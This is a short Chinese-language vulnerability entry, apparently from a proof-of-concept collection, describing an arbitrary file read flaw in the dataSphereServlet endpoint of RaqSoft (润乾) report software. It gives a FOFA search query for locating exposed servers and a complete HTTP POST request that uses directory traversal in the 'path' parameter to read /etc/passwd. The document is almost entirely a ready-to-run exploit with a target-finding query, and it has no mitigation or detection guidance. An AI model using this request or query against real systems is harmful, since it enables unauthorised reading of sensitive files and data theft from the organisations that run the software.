# 润乾报表dataSphereServlet接口存在任意文件读取漏洞

润乾报表dataSphereServlet接口存在任意文件读取漏洞，可读取系统敏感文件导致数据泄露。

## fofa

```yaml
body="/raqsoft"
```

## poc

```yaml
POST /servlet/dataSphereServlet?action=11 HTTP/1.1
Host: {{Hostname}}
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
DNT: 1
Sec-GPC: 1
Connection: close
sec-ch-ua-platform: "macOS"
sec-ch-ua: "Google Chrome";v="118", "Chromium";v="118", "Not=A?Brand";v="24"
sec-ch-ua-mobile: ?0
Content-Length: 63
Content-Type: application/x-www-form-urlencoded

path=../../../../../../../../../../../etc/passwd&content=&mode=
```

